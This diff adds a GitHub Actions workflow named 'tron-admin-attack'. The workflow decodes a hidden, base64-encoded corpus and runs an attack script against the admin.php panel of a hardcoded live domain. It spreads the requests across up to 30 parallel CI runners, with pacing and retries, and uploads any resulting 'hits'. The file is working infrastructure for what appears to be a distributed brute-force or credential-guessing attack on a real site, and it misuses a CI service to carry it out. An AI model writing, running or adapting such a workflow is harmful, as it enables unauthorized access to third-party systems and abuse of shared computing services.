@@ -1,0 +1,70 @@
+name: tron-admin-attack
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "admin | recon | both"
+        required: true
+        default: "admin"
+      shard_list:
+        description: "JSON array of shard ids"
+        required: false
+        default: '[0]'
+      shards:
+        description: "total shards"
+        required: false
+        default: '1'
+      conc:
+        description: "concurrency"
+        required: false
+        default: '2'
+      pace:
+        description: "seconds between requests"
+        required: false
+        default: '0.15'
+      retries:
+        description: "retries on 5xx / network error"
+        required: false
+        default: '8'
+      action:
+        description: "admin.php action"
+        required: false
+        default: 'stats'
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+    strategy:
+      fail-fast: false
+      max-parallel: 30
+      matrix:
+        shard: ${{ fromJSON(github.event.inputs.shard_list) }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: python3 -m pip install --quiet requests >/dev/null 2>&1 || true
+      - name: decode corpus
+        run: |
+          base64 -d attack/corpus.b64 | gunzip > attack/corpus.txt
+          wc -l attack/corpus.txt
+      - name: run
+        env:
+          MODE: ${{ github.event.inputs.mode }}
+          SHARD: ${{ matrix.shard }}
+          SHARDS: ${{ github.event.inputs.shards }}
+          CONC: ${{ github.event.inputs.conc }}
+          PACE: ${{ github.event.inputs.pace }}
+          RETRIES: ${{ github.event.inputs.retries }}
+          ACTION: ${{ github.event.inputs.action }}
+          CORPUS: attack/corpus.txt
+          TARGET: https://tronsick.io
+        run: |
+          echo "===== shard $SHARD / $SHARDS mode $MODE ====="
+          python3 attack/tron_admin.py 2>&1 | tee out-${{ matrix.shard }}.txt
+      - name: upload hits
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tron-admin-${{ matrix.shard }}
+          path: hits/
+          if-no-files-found: ignore
